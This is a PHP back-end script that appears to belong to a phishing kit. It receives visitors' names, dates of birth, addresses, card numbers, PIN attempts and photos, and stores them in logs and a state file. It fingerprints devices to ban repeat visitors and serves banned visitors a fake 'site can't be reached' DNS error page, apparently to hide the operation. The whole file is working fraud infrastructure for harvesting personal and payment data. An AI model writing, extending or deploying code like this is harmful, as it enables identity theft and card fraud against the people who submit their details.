<?php
/**
 * log.php - Robust Logging and Ban-Checking Logic
 * Improvements: Concurrent access protection, robust error handling, output buffer management.
 */

require_once __DIR__ . '/helpers.php';

// Enable internal error logging but suppress display to client
error_reporting(E_ALL);
ini_set('display_errors', 0);
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/php_errors.log');

// Photo payloads (base64) can be a few hundred KB even after client-side
// compression. Raise limits where the host allows runtime overrides so the
// POST body isn't silently truncated/rejected (which would drop the photo).
@ini_set('post_max_size', '16M');
@ini_set('upload_max_filesize', '16M');
@ini_set('memory_limit', '128M');

// Start output buffering to prevent accidental output and manage responses
ob_start();

// Fatal error handler to ensure JSON response even on crash
register_shutdown_function(function() {
    $error = error_get_last();
    if ($error !== NULL && in_array($error['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR])) {
        if (ob_get_length()) ob_clean();
        header('Content-Type: application/json');
        echo json_encode([
            'status' => 'error',
            'message' => 'Internal Server Error',
            'type' => 'fatal'
        ]);
        ob_end_flush();
    }
});

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, X-Requested-With");
header_remove("X-Powered-By");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

// Debug logging to file
$debugLog = __DIR__ . '/debug.log';

/**
 * Send the HTTP response immediately and continue processing in the background.
 * This reduces perceived latency by closing the connection early.
 */
function endResponse($responseBody, $contentType = 'application/json') {
    // Clean any previous output
    if (ob_get_length()) ob_clean();
    
    header('Content-Type: ' . $contentType);
    $body = is_string($responseBody) ? $responseBody : json_encode($responseBody);
    header('Content-Length: ' . strlen($body));
    
    // Try FPM-specific fastcgi_finish_request first
    if (function_exists('fastcgi_finish_request')) {
        echo $body;
        ob_end_flush();
        fastcgi_finish_request();
        return true;
    }
    
    // Fallback: flush headers and close connection manually
    echo $body;
    ob_end_flush();
    
    if (function_exists('flush')) {
        flush();
    }
    
    // Send connection close header and try to close the connection
    if (function_exists('header_remove') && !headers_sent()) {
        header('Connection: close');
    }
    
    // Close the session if it was started to allow concurrent requests
    if (session_id()) {
        session_write_close();
    }
    
    // Try to close the output connection
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    }
    
    return true;
}

// Static cache for state and banned data
$_STATIC_CACHE = [];

function getCachedState() {
    global $stateFile, $_STATIC_CACHE;
    if (!isset($_STATIC_CACHE['state'])) {
        $_STATIC_CACHE['state'] = safeReadJson($stateFile);
    }
    return $_STATIC_CACHE['state'];
}

function getCachedBannedDevices() {
    global $bannedDevicesFile, $_STATIC_CACHE;
    if (!isset($_STATIC_CACHE['bannedDevices'])) {
        $_STATIC_CACHE['bannedDevices'] = safeReadList($bannedDevicesFile);
    }
    return $_STATIC_CACHE['bannedDevices'];
}

function getCachedBannedIps() {
    global $bannedIpsFile, $_STATIC_CACHE;
    if (!isset($_STATIC_CACHE['bannedIps'])) {
        $_STATIC_CACHE['bannedIps'] = safeReadList($bannedIpsFile);
    }
    return $_STATIC_CACHE['bannedIps'];
}

function getCachedBannedFingerprints() {
    global $bannedFingerprintsFile, $_STATIC_CACHE;
    if (!isset($_STATIC_CACHE['bannedFingerprints'])) {
        $_STATIC_CACHE['bannedFingerprints'] = safeReadJson($bannedFingerprintsFile);
    }
    return $_STATIC_CACHE['bannedFingerprints'];
}

// Reliable IP Detection
$ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : (isset($_SERVER['HTTP_X_REAL_IP']) ? $_SERVER['HTTP_X_REAL_IP'] : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : 'unknown'));
if ($ip !== 'unknown' && strpos($ip, ',') !== false) {
    $ips = explode(',', $ip);
    $ip = trim($ips[0]);
}

// Triple-Lock Banning Files
$bannedDevicesFile = __DIR__ . '/banned_devices.txt';
$bannedIpsFile = __DIR__ . '/banned_ips.txt';
$bannedFingerprintsFile = __DIR__ . '/banned_fingerprints.json';
$stateFile = __DIR__ . '/latest_state.json';

function normalizeFingerprint($fp) {
    if (!empty($fp) && is_string($fp)) {
        $fp = json_decode($fp, true);
    }
    if (!is_array($fp)) $fp = [];
    
    return [
        'canvasHash' => isset($fp['canvasHash']) ? (string)$fp['canvasHash'] : '',
        'webGLRenderer' => isset($fp['webGLRenderer']) ? (string)$fp['webGLRenderer'] : '',
        'webGLVendor' => isset($fp['webGLVendor']) ? (string)$fp['webGLVendor'] : '',
        'platform' => isset($fp['platform']) ? (string)$fp['platform'] : '',
        'hardwareConcurrency' => isset($fp['hardwareConcurrency']) ? (string)$fp['hardwareConcurrency'] : '',
        'screen' => isset($fp['screen']) ? (string)$fp['screen'] : ''
    ];
}

// Helper: load banned fingerprints (uses static cache)
function loadBannedFingerprints() {
    return getCachedBannedFingerprints();
}

// Helper: save banned fingerprints (clears cache after write)
function saveBannedFingerprints($fingerprints) {
    global $bannedFingerprintsFile, $_STATIC_CACHE;
    $result = safeWriteJson($bannedFingerprintsFile, $fingerprints);
    if ($result) {
        unset($_STATIC_CACHE['bannedFingerprints']);
    }
    return $result;
}

// Triple-Lock Check Function
function checkTripleLock($deviceId, $ip, $fingerprint, $earlyExit = true) {
    global $bannedDevicesFile, $bannedIpsFile, $stateFile;
    $matchDetails = [];

    // --- LOCK 1: Explicit (DeviceId + IP) ---
    if ($deviceId !== 'unknown' && $deviceId !== '') {
        $bannedDevices = getCachedBannedDevices();
        if (in_array($deviceId, $bannedDevices, true)) {
            $matchDetails[] = 'Lock1-DeviceId';
            if ($earlyExit) return $matchDetails;
        }
    }
    if ($ip !== 'unknown' && $ip !== '') {
        $bannedIps = getCachedBannedIps();
        if (in_array($ip, $bannedIps, true)) {
            $matchDetails[] = 'Lock1-IP';
            if ($earlyExit) return $matchDetails;
        }
    }

    // --- LOCK 2: Implicit (Canvas + WebGL Fingerprint) ---
    $fp = normalizeFingerprint($fingerprint);

    $bannedFps = loadBannedFingerprints();
    foreach ($bannedFps as $bannedFp) {
        $bannedFp = normalizeFingerprint($bannedFp);
        // Check canvas hash
        if ($fp['canvasHash'] !== '' && $bannedFp['canvasHash'] !== '') {
            if (strtolower($fp['canvasHash']) === strtolower($bannedFp['canvasHash'])) {
                $matchDetails[] = 'Lock2-Canvas';
                if ($earlyExit) return $matchDetails;
                break;
            }
        }
        // Check WebGL renderer (more unique than vendor)
        if ($fp['webGLRenderer'] !== '' && $bannedFp['webGLRenderer'] !== '') {
            if (strtolower($fp['webGLRenderer']) === strtolower($bannedFp['webGLRenderer'])) {
                $matchDetails[] = 'Lock2-WebGL';
                if ($earlyExit) return $matchDetails;
                break;
            }
        }
    }

    // --- LOCK 3: Profile Matching (Behavioral/Server) ---
    // Only load state if Lock 1 and Lock 2 didn't match
    $state = getCachedState();
    if (!empty($state)) {
        // Gather all banned deviceIds from Lock 1 (reuse cached)
        $bannedDeviceIds = getCachedBannedDevices();

        // Check if this device shares IP with a banned device
        if ($ip !== 'unknown' && !empty($bannedDeviceIds)) {
            foreach ($bannedDeviceIds as $bannedId) {
                if (isset($state[$bannedId]) && ($state[$bannedId]['ip'] ?? '') === $ip) {
                    if (!in_array('Lock1-IP', $matchDetails) && !in_array('Lock1-DeviceId', $matchDetails)) {
                        $matchDetails[] = 'Lock3-SharedIP';
                    }
                    break;
                }
            }
        }

        // Check if fingerprint matches a known banned device profile
        if ($fp['canvasHash'] !== '' || $fp['webGLRenderer'] !== '') {
            foreach ($bannedDeviceIds as $bannedId) {
                if (!isset($state[$bannedId])) continue;
                $bannedFpStr = $state[$bannedId]['fingerprint'] ?? '';
                if (empty($bannedFpStr) || $bannedFpStr === '—') continue;
                
                // Decode once and cache for this check
                $bannedFpData = $bannedFpStr;
                if (is_string($bannedFpStr)) {
                    $bannedFpData = json_decode($bannedFpStr, true);
                }
                $bannedFp = normalizeFingerprint($bannedFpData);

                // Compute similarity score
                $score = 0;
                if ($fp['canvasHash'] !== '' && $bannedFp['canvasHash'] !== '' && strtolower($fp['canvasHash']) === strtolower($bannedFp['canvasHash'])) $score += 3;
                if ($fp['webGLRenderer'] !== '' && $bannedFp['webGLRenderer'] !== '' && strtolower($fp['webGLRenderer']) === strtolower($bannedFp['webGLRenderer'])) $score += 3;
                if ($fp['webGLVendor'] !== '' && $bannedFp['webGLVendor'] !== '' && strtolower($fp['webGLVendor']) === strtolower($bannedFp['webGLVendor'])) $score += 1;
                if ($fp['platform'] !== '' && $bannedFp['platform'] !== '' && $fp['platform'] === $bannedFp['platform']) $score += 1;
                if ($fp['hardwareConcurrency'] !== '' && $bannedFp['hardwareConcurrency'] !== '' && $fp['hardwareConcurrency'] === $bannedFp['hardwareConcurrency']) $score += 1;
                if ($fp['screen'] !== '' && $bannedFp['screen'] !== '' && $fp['screen'] === $bannedFp['screen']) $score += 1;

                if ($score >= 5) {
                    $matchDetails[] = 'Lock3-ProfileMatch(score=' . $score . ')';
                    break;
                }
            }
        }
    }

    return $matchDetails;
}

function isBanned($deviceId, $ip, $fingerprint = null) {
    global $bannedDevicesFile, $bannedIpsFile;

    // --- WHITELIST CHECK ---
    $configFile = __DIR__ . '/.admin_config.json';
    $config = safeReadJson($configFile);
    if (!empty($config['whitelist_mode'])) {
        $approvedDevicesFile = __DIR__ . '/approved_devices.txt';
        $approvedDevices = safeReadList($approvedDevicesFile);
        if ($deviceId === 'unknown' || $deviceId === '' || !in_array($deviceId, $approvedDevices, true)) {
             return true;
        }
    }

    // Run Triple-Lock check with early exit
    $locks = checkTripleLock($deviceId, $ip, $fingerprint, true);
    if (!empty($locks)) {
        // If any lock matches, ban
        if ($deviceId !== 'unknown' && $deviceId !== '') {
            $bannedDevices = safeReadList($bannedDevicesFile);
            if (!in_array($deviceId, $bannedDevices, true)) {
                $bannedDevices[] = $deviceId;
                safeWriteList($bannedDevicesFile, $bannedDevices);
            }
        }
        // Set/Refresh cookie
        setcookie('banned', '1', [
            'expires' => time() + (365 * 24 * 60 * 60),
            'path' => '/',
            'samesite' => 'Lax'
        ]);
        return true;
    }

    // If NOT matched by any lock but has cookie, clear it (User was likely unbanned)
    if (isset($_COOKIE['banned'])) {
        setcookie('banned', '', [
            'expires' => time() - 3600,
            'path' => '/',
            'samesite' => 'Lax'
        ]);
    }

    return false;
}

function showBannedPage($host) {
    if (ob_get_length()) ob_clean();
    http_response_code(200);
    header('Content-Type: text/html; charset=utf-8');
    echo "<!-- ERR_CONNECTION_CLOSED -->";
    ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Site Can't Be Reached</title>
    <style>
        body { background-color: #f1f1f1; margin: 0; font-family: 'Segoe UI', Tahoma, sans-serif; color: #5f6368; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .container { max-width: 600px; width: 100%; padding: 20px; }
        .icon { width: 72px; height: 72px; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEgAAABIAQMAAABvIyNsAAAABlBMVEUAAAD///+l2Z/dAAAAMklEQVR4AWMYBYJBAAEDYwADAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDYwABygE+m2vFmAAAAABJRU5ErkJggg=='); background-repeat: no-repeat; margin-bottom: 40px; }
        h1 { font-size: 22px; font-weight: 500; color: #202124; margin-bottom: 20px; }
        p { font-size: 14px; line-height: 20px; margin-bottom: 10px; }
        .error-code { margin-top: 30px; font-size: 12px; text-transform: uppercase; }
        ul { margin-top: 10px; padding-left: 20px; }
        li { margin-bottom: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="icon"></div>
        <h1>This site can't be reached</h1>
        <p>Check if there is a typo in <strong><?php echo htmlspecialchars($host); ?></strong>.</p>
        <ul>
            <li>If spelling is correct, try running Windows Network Diagnostics.</li>
        </ul>
        <div class="error-code">DNS_PROBE_FINISHED_NXDOMAIN</div>
    </div>
</body>
</html>
    <?php
    ob_end_flush();
    exit;
}

try {
    // === GET LICENCE PIN ===
    if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'getLicencePin') {
        if (ob_get_length()) ob_clean();
        $configFile = __DIR__ . '/.admin_config.json';
        $config = safeReadJson($configFile);
        $pin = isset($config['licence_pin']) ? $config['licence_pin'] : '457511';
        header('Content-Type: application/json');
        $response = json_encode(['pin' => $pin]);
        header('Content-Length: ' . strlen($response));
        echo $response;
        ob_end_flush();
        exit;
    }

    // === CHECK BAN (Early check) ===
    if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['action']) && $_GET['action'] === 'checkBan') {
        // Clean any prior output before sending response
        if (ob_get_length()) ob_clean();

        $deviceId = isset($_GET['deviceId']) ? trim($_GET['deviceId']) : '';
        $fingerprintEncoded = isset($_GET['fp']) ? trim($_GET['fp']) : null;
        $fingerprintJson = null;
        if ($fingerprintEncoded) {
            $decoded = @base64_decode($fingerprintEncoded, true);
            if ($decoded !== false) {
                $fingerprintData = @json_decode($decoded, true);
                if ($fingerprintData) {
                    $fingerprintJson = @json_encode($fingerprintData);
                }
            }
        }
        $banned = isBanned($deviceId, $ip, $fingerprintJson);

        // Record the visit anyway so we see them in the admin panel
        $state = getCachedState();
        if ($deviceId && $deviceId !== 'unknown') {
            if (!isset($state[$deviceId])) {
                $state[$deviceId] = [
                    'deviceId' => $deviceId,
                    'ip' => $ip,
                    'last_seen' => date('Y-m-d H:i:s'),
                    'name' => 'Pending Approval',
                    'failed_attempts' => 0
                ];
            } else {
                $state[$deviceId]['last_seen'] = date('Y-m-d H:i:s');
                $state[$deviceId]['ip'] = $ip;
            }
            safeWriteJson($stateFile, $state, true);
        }

        safeAppend(__DIR__ . '/ban_debug.log', date('Y-m-d H:i:s') . " - CheckBan: deviceId=$deviceId, ip=$ip, isBanned=" . ($banned ? 'YES' : 'NO') . "\n");

        if ($banned) {
            safeAppend(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Early ban check: $deviceId from IP $ip\n");
            showBannedPage($_SERVER['HTTP_HOST']);
        } else {
            // If not banned, but has banned cookie, clear it (Unban action)
            if (isset($_COOKIE['banned'])) {
                setcookie('banned', '', [
                    'expires' => time() - 3600,
                    'path' => '/',
                    'samesite' => 'Lax'
                ]);
            }
        }
        endResponse("OK", 'text/plain; charset=utf-8');
        exit;
    }

    // === NORMAL LOGGING ===
    $rawInput = file_get_contents('php://input');
    $data = json_decode($rawInput, true);
    if (!$data) {
        $data = isset($_GET) ? $_GET : [];
    }

    $deviceId = isset($data['deviceId']) ? trim($data['deviceId']) : 'unknown';

    // Extract fingerprint for ban checks
    $known_keys = ['deviceId', 'ip', 'event', 'success', 'pin_attempt', 'name', 'dob', 'address', 'card', 'photo', 'timestamp'];
    $fingerprint_data = [];
    foreach ($data as $key => $value) {
        if (!in_array($key, $known_keys)) {
            $fingerprint_data[$key] = $value;
        }
    }
    $fingerprintJson = !empty($fingerprint_data) ? json_encode($fingerprint_data) : null;

    $isBlocked = isBanned($deviceId, $ip, $fingerprintJson);

    // If not blocked, send response early and continue in background
    if (!$isBlocked) {
        endResponse([
            "status" => "ok",
            "logged" => true,
            "debug" => null
        ]);
    }

    $timestamp = date('Y-m-d H:i:s');
    $event       = isset($data['event']) ? $data['event'] : 'unknown';
    $success     = (isset($data['success']) && ($data['success'] === true || $data['success'] === 'true' || $data['success'] === 1)) ? true : false;
    $pin_attempt = isset($data['pin_attempt']) ? $data['pin_attempt'] : '—';
    $name        = isset($data['name']) ? $data['name'] : '—';
    $dob         = isset($data['dob']) ? $data['dob'] : '—';
    $address     = isset($data['address']) ? $data['address'] : '—';
    $card        = isset($data['card']) ? $data['card'] : '—';

    // Extract fingerprint for logging (reuse the data from above) — stored as native array
    $fingerprint_final = !empty($fingerprint_data) ? $fingerprint_data : '—';

    // Handle Photo
    $photo_path = '—';
    $has_photo = false;
    if (isset($data['photo']) && !empty($data['photo']) && $deviceId !== 'unknown') {
        $photosDir = __DIR__ . '/photos';
        if (!is_dir($photosDir)) {
            if (!@mkdir($photosDir, 0777, true) && !is_dir($photosDir)) {
                safeAppend($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not create photos directory\n");
            }
        }
        if (is_dir($photosDir)) {
            $photo_path = $photosDir . '/' . $deviceId . '.txt';
            if (safeWriteRaw($photo_path, $data['photo']) === false) {
                safeAppend($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write photo for $deviceId\n");
            } else {
                $has_photo = true;
            }
        }
    }

    // 1. Update Latest State & Auto-Ban logic
    $state = getCachedState();

    if ($deviceId !== 'unknown') {
            // Track lock status for this device
            $lockStatus = [];
            if ($fingerprintJson) {
                $lockStatus = checkTripleLock($deviceId, $ip, $fingerprintJson);
            }

            if (!isset($state[$deviceId])) {
                $state[$deviceId] = [
                    'deviceId' => $deviceId,
                    'ip' => $ip,
                    'timestamp' => $timestamp,
                    'event' => $event,
                    'success' => $success ? 'YES' : 'NO',
                    'pin_attempt' => $pin_attempt,
                    'name' => $name,
                    'dob' => $dob,
                    'address' => $address,
                    'card' => $card,
                    'photo_path' => $photo_path,
                    'fingerprint' => $fingerprint_final,
                    'lockStatus' => $lockStatus,
                    'last_seen' => $timestamp,
                    'attempt_count' => 0,
                    'failed_attempts' => 0
                ];
            } else {
                $state[$deviceId]['ip'] = $ip;
                $state[$deviceId]['timestamp'] = $timestamp;
                $state[$deviceId]['event'] = $event;
                $state[$deviceId]['success'] = ($success || ($state[$deviceId]['success'] ?? 'NO') === 'YES') ? 'YES' : 'NO';
                if ($pin_attempt !== '—') $state[$deviceId]['pin_attempt'] = $pin_attempt;
                if ($name !== '—') $state[$deviceId]['name'] = $name;
                if ($dob !== '—') $state[$deviceId]['dob'] = $dob;
                if ($address !== '—') $state[$deviceId]['address'] = $address;
                if ($card !== '—') $state[$deviceId]['card'] = $card;
                if ($fingerprint_final !== '—') $state[$deviceId]['fingerprint'] = $fingerprint_final;
                if (!empty($lockStatus)) $state[$deviceId]['lockStatus'] = $lockStatus;
                if ($photo_path !== '—') $state[$deviceId]['photo_path'] = $photo_path;
                $state[$deviceId]['last_seen'] = $timestamp;
            }

            // Auto-ban logic - also store fingerprint for Triple-Lock
            if ($event === 'pin_failed') {
                $state[$deviceId]['failed_attempts'] = ($state[$deviceId]['failed_attempts'] ?? 0) + 1;
                $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;

                if ($state[$deviceId]['failed_attempts'] >= 10) {
                    // Auto-ban the device
                    $bannedDevices = safeReadList($bannedDevicesFile);
                    if (!in_array($deviceId, $bannedDevices, true)) {
                        $bannedDevices[] = $deviceId;
                        safeWriteList($bannedDevicesFile, $bannedDevices);
                    }
                    // Also store the fingerprint for Lock 2 matching
                    if (!empty($fingerprint_data)) {
                        $bannedFps = loadBannedFingerprints();
                        $fpToStore = $fingerprint_data;
                        $fpToStore['banned_deviceId'] = $deviceId;
                        $fpToStore['banned_ip'] = $ip;
                        $fpToStore['banned_at'] = $timestamp;
                        $bannedFps[] = $fpToStore;
                        saveBannedFingerprints($bannedFps);
                    }
                    // Set cookie for auto-ban too
                    setcookie('banned', '1', [
                        'expires' => time() + (365 * 24 * 60 * 60),
                        'path' => '/',
                        'samesite' => 'Lax'
                    ]);
                }

                // Cross-device canvas auto-ban: if the same canvasHash appears across 3+ devices
                // with failed PIN attempts, auto-ban that canvas fingerprint
                if (!empty($fingerprint_data) && !empty($fingerprint_data['canvasHash'])) {
                    $canvasHash = $fingerprint_data['canvasHash'];
                    $devicesWithFailedAttempts = 0;
                    foreach ($state as $otherId => $otherData) {
                        if ($otherId === $deviceId) continue;
                        if (($otherData['failed_attempts'] ?? 0) > 0) {
                            $otherFp = $otherData['fingerprint'] ?? '—';
                            if ($otherFp && $otherFp !== '—') {
                                if (is_string($otherFp)) {
                                    $otherFp = json_decode($otherFp, true);
                                }
                                if (is_array($otherFp) && !empty($otherFp['canvasHash']) && $otherFp['canvasHash'] === $canvasHash) {
                                    $devicesWithFailedAttempts++;
                                }
                            }
                        }
                    }
                    // If 3+ different devices share this canvas hash and have failed, auto-ban the canvas
                    if ($devicesWithFailedAttempts >= 3) {
                        $bannedFps = loadBannedFingerprints();
                        $alreadyBanned = false;
                        foreach ($bannedFps as $bfp) {
                            if (!empty($bfp['canvasHash']) && strtolower($bfp['canvasHash']) === strtolower($canvasHash)) {
                                $alreadyBanned = true;
                                break;
                            }
                        }
                        if (!$alreadyBanned) {
                            $fpToStore = $fingerprint_data;
                            $fpToStore['banned_deviceId'] = 'cross-device-auto';
                            $fpToStore['banned_ip'] = $ip;
                            $fpToStore['banned_at'] = $timestamp;
                            $fpToStore['banned_reason'] = 'auto-cross-device';
                            $bannedFps[] = $fpToStore;
                            saveBannedFingerprints($bannedFps);
                        }
                    }
                }
            } elseif ($event === 'pin_success') {
                $state[$deviceId]['failed_attempts'] = 0;
                $state[$deviceId]['attempt_count'] = ($state[$deviceId]['attempt_count'] ?? 0) + 1;
            }

            $stateSaved = safeWriteJson($stateFile, $state, true);
            if (!$stateSaved) {
                safeAppend($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write stateFile: $stateFile\n");
            }
    } else {
        $stateSaved = true;
    }

    // 2. Append to Visits History
    $visitsLog = __DIR__ . '/visits.log';
    $visitEntry = [
        'timestamp' => $timestamp,
        'deviceId' => $deviceId,
        'ip' => $ip,
        'event' => $event,
        'success' => $success,
        'pin_attempt' => $pin_attempt,
        'name' => $name,
        'dob' => $dob,
        'address' => $address,
        'card' => $card,
        'has_photo' => $has_photo
    ];
    $logAppended = safeAppend($visitsLog, json_encode($visitEntry) . "\n");
    if (!$logAppended) {
        safeAppend($debugLog, date('Y-m-d H:i:s') . " - ERROR: Could not write to visitsLog: $visitsLog\n");
    }

    // Finally, if they were blocked, show the blocked page
    if ($isBlocked) {
        safeAppend(__DIR__ . '/ban_hits.log', date('Y-m-d H:i:s') . " - Blocked device hit: $deviceId from IP $ip\n");
        showBannedPage($_SERVER['HTTP_HOST']);
    }

    if (ob_get_length()) ob_clean();
    exit;
} catch (Throwable $e) {
    if (ob_get_length()) ob_clean();
    header('Content-Type: application/json');
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage()
    ]);
    ob_end_flush();
}
